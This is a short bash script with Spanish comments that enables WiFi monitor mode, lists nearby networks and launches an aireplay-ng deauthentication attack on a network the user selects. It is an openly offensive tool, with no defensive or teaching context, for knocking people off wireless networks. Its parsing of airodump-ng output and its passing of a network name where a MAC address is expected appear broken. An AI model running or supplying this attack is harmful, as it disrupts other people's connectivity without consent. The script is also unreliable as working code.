#!/bin/bash

# Colores
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
WHITE="\033[1;37m"

IFACE=""

# Muestra interfaces WiFi y permite elegir
choose_iface() {

  echo -e "\n${WHITE}Interfaces WiFi disponibles:"

  ifaces=($(iwconfig 2>/dev/null | grep Wireless | awk '{print $1}'))

  for ((i=0; i<${#ifaces[@]}; i++)); do
    echo -e "${GREEN}$i) ${ifaces[$i]}"
  done

  read -p "Elige la interfaz a utilizar: " option

  IFACE=${ifaces[$option]}

}

# Activa modo monitor en la interfaz  
enable_monitor() {

  airmon-ng check kill
  ip link set $IFACE down
  iw dev $IFACE set type monitor 
  ip link set $IFACE up

}

# Desactiva modo monitor
disable_monitor() {

  ip link set $IFACE down
  iw dev $IFACE set type managed
  ip link set $IFACE up 
  nmcli radio wifi on
  nmcli device connect $IFACE

}

# Encuentra redes WiFi disponibles
get_targets() {

  echo -e "\n${WHITE}Buscando redes WiFi disponibles...${WHITE}\n" 

  nets=($(airodump-ng -a --band abg $IFACE | grep -w ESSID | awk -F' ' '{print $2}'))

  echo -e "${WHITE}Redes Encontradas:\n"

  for ((i=0; i<${#nets[@]}; i++)); do
    echo -e "${RED}$i) ${nets[$i]}"
  done

}

# Realiza ataque deauth
attack() {

  echo -e "\n${RED}[+] ${WHITE}Iniciando ataque Deauth a ${YELLOW}$1${WHITE}"

  timeout 60s aireplay-ng -0 2 -a $1 $IFACE
  
  echo -e "\n${GREEN}[+] ${WHITE}Ataque finalizado!${WHITE}\n"  

}

# Flujo principal
choose_iface
enable_monitor
get_targets   

read -p "Ingresa el número de red a atacar: " target
SSID=${nets[$target]}

attack $SSID
disable_monitor
